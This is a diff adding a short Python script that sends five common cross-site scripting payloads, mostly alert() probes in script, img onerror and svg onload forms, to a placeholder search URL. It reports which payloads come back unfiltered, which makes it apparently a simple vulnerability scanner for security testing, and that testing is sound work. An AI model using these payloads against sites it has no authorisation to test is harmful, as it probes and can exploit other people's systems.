@@ -1,0 +1,24 @@
+import requests
+
+# Target URL to test
+target_url = "http://example.com/search"  # Replace with your URL
+
+# Common XSS payloads
+payloads = [
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "'><script>alert('XSS')</script>",
+    "\";alert('XSS');//",
+    "<svg/onload=alert('XSS')>",
+]
+
+# Test each payload
+for payload in payloads:
+    print(f"Testing payload: {payload}")
+    params = {"q": payload}  # Replace 'q' with the query parameter of your application
+    response = requests.get(target_url, params=params)
+    
+    if payload in response.text:
+        print(f"Potential XSS vulnerability detected with payload: {payload}\n")
+    else:
+        print(f"Payload {payload} seems to be filtered.\n")
